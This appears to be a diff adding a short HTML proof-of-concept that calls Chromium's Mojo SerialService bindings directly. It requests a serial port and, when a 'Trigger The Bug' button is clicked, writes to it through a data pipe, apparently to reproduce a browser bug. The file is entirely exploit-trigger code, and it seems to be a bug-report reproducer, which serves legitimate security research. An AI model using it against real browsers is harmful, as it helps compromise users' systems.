@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="./mojo_bindings.js"></script>
+    <script src="./third_party/blink/public/mojom/serial/serial.mojom.js"></script>
+    <button id="triggerButton">Trigger The Bug</button>
+<script>
+    var ss_ptr = new blink.mojom.SerialServicePtr();
+    Mojo.bindInterface(blink.mojom.SerialService.name,mojo.makeRequest(ss_ptr).handle);
+    var pt_rc = new device.mojom.SerialPortPtr();
+    
+    ss_ptr.requestPort([]).then(res=>{
+        console.log(res.port.token);
+        ss_ptr.getPort(res.port.token,mojo.makeRequest(pt_rc));
+    });
+    
+    triggerButton = document.querySelector('#triggerButton');
+    triggerButton.addEventListener('click', async event => {
+        var DATA_PIPE_PARAMS = {
+            elementNumBytes: 1,
+            capacityNumBytes: 64
+        };
+        var pipe1 = Mojo.createDataPipe(DATA_PIPE_PARAMS); 
+
+        pt_rc.startWriting(pipe1.consumer);
+
+        var data = new Uint8Array([0x31]);
+        pipe1.producer.writeData(data);
+    }); 
+</script>
+</head>
+</html>
